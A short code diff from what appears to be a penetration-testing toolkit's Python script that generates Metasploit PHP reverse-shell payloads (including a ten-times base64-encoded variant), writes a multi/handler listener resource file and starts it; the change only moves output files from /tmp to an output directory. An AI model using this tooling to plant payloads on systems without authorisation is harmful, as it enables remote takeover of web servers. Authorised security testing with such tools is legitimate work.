@@ -40,11 +40,11 @@ while 1:
 		# create payload
 		if selection == '1' or selection == '2':
 			PrintInfo("Creating payload please wait...")
-			subprocess.Popen("%s/msfpayload %s lhost=%s lport=%s R > /tmp/%s.php" % (msfpath(), payload, ip, port, filename), shell=True).wait()
+			subprocess.Popen("%s/msfpayload %s lhost=%s lport=%s R > output/%s.php" % (msfpath(), payload, ip, port, filename), shell=True).wait()
 			PrintError("Remember to edit the payload and remove the initial # from the the php tag")
 		elif selection == '3' or selection =='':
 			PrintInfo("Creating payload with x10 base64. Please wait...")
-			subprocess.Popen("%s/msfvenom -p %s lhost=%s lport=%s -e php/base64 -i 10 -f raw > /tmp/%s.php" % (msfpath(), payload, ip, port, filename), shell=True).wait()
+			subprocess.Popen("%s/msfvenom -p %s lhost=%s lport=%s -e php/base64 -i 10 -f raw > output/%s.php" % (msfpath(), payload, ip, port, filename), shell=True).wait()
 			PrintError("Remember to add php tags to the payload (<?php ?>)")
 	
 		# start multi handler
@@ -52,7 +52,7 @@ while 1:
 		if not answer or answer in ('Y','y',''):
 
 			# create rc file
-			rcfile = "/tmp/php_listener.rc"
+			rcfile = "output/php_listener.rc"
 			fw = open(rcfile, "w")
 			fw.write("use exploit/multi/handler\n")
 			fw.write("set PAYLOAD %s\n" % payload)
@@ -72,13 +72,13 @@ while 1:
 	
 			PrintInfo("Cleaning up...")
 			os.remove(rcfile)
-			os.remove("/tmp/"+filename+".php")
+			os.remove("output/"+filename+".php")
 			sleep(1)
 			# return to main
 			break
 	
 		else:
-			Notify("Payload created in your /tmp directory", "2")
+			Notify("Payload created in the output directory", "2")
 			
 			# return to main
 			EntContinue()
